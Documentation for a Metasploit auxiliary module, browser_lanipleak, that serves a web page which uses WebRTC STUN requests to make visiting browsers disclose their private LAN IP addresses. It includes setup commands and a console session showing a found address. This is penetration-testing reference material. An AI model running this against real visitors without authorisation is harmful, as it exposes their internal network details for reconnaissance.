## Vulnerable Application

This module retrieves a browser's network interface IP addresses using WebRTC. However, after visiting the HTTP server, the browser can disclose a private IP address in a STUN request.

Related links : https://datarift.blogspot.in/p/private-ip-leakage-using-webrtc.html

## Verification

    Start msfconsole
    use auxiliary/gather/browser_lanipleak
    Set SRVHOST
    Set SRVPORT
    run (Server started)
Visit server URL in any browser which has WebRTC enabled

## Scenarios

```
msf auxiliary(gather/browser_lanipleak) > show options 

Module options (auxiliary/gather/browser_lanipleak):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  192.168.1.104    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name       Description
   ----       -----------
   WebServer  


msf auxiliary(gather/browser_lanipleak) > run
[*] Auxiliary module running as background job 0.
msf auxiliary(gather/browser_lanipleak) > 
[*] Using URL: http://192.168.1.104:8080/mIV1EgzDiEEIMT
[*] Server started.

[*] 192.168.1.104: Sending response (2523 bytes)
[+] 192.168.1.104: Found IP address: X.X.X.X
```
